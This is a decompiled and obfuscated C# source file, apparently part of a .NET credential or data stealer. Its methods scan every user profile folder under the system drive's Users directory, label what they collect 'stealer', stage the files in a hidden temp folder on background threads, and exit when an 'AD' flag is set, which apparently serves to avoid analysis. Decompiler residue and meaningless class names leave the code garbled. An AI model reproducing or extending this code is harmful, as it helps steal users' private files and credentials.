using GDBD.Importers;
using GDBD.Mappers;
using GDBD.Specifications;
using GDBD.Structs;
using GDBD.Workers;
using Newtonsoft.Annotations;
using Newtonsoft.Expressions;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

namespace GDBD.Maps
{
	internal sealed class OrderIteratorMapping
	{
		[Serializable]
		[CompilerGenerated]
		private sealed class CustomerConfig
		{
			public static readonly CustomerConfig _InfoConfig;

			public static ThreadStart _AttrConfig;

			public static ThreadStart m_PolicyConfig;

			[MethodImpl(MethodImplOptions.NoInlining)]
			static CustomerConfig()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				_InfoConfig = new CustomerConfig();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			public CustomerConfig()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				DispatcherInstanceExpression.CustomizeFilter(new Context().CalculateEvent(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\", regclose: true, ispool: true, isres2: true, calcasset3: false, comparecfg4: true, comparecol5: true, isinstance6: true, getvalue7: true, iscont8: true, containscol9: true, istoken10: true, appendvalue11: true), "stealer", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
				GC.Collect();
				if (DecoratorReaderMapper.PatchRequest(MappingListAnnotation.m_ServiceEvent)["AD"].ResetClass<bool>())
				{
					Environment.Exit(0);
				}
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0002()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				Collection.NewEvent(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\");
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void DisableRecord()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			new Thread((ThreadStart)delegate
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				DispatcherInstanceExpression.CustomizeFilter(new Context().CalculateEvent(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\", regclose: true, ispool: true, isres2: true, calcasset3: false, comparecfg4: true, comparecol5: true, isinstance6: true, getvalue7: true, iscont8: true, containscol9: true, istoken10: true, appendvalue11: true), "stealer", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
				GC.Collect();
				if (DecoratorReaderMapper.PatchRequest(MappingListAnnotation.m_ServiceEvent)["AD"].ResetClass<bool>())
				{
					Environment.Exit(0);
				}
			}).Start();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void VerifyRecord()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				if (!Directory.Exists(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent)))
				{
					Directory.CreateDirectory(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent));
				}
			}
			catch
			{
			}
			new Thread((ThreadStart)delegate
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				Collection.NewEvent(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\");
			}).Start();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public OrderIteratorMapping()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}
	}
}
